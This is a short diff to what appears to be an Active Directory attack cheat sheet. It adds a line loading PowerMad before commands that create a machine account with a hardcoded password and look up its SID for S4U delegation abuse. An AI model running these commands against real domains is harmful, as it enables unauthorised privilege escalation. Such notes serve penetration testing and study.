@@ -1139,6 +1139,8 @@ Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Memb
 
 create machine account (with powermad) and run s4u:
 ```
+. .\PowerMad.ps1
+
 New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'Password01' -AsPlainText -Force) -Verbose
 
 $ComputerSid = Get-DomainComputer <MachineAccountName> -Properties objectsid | Select -Expand objectsid
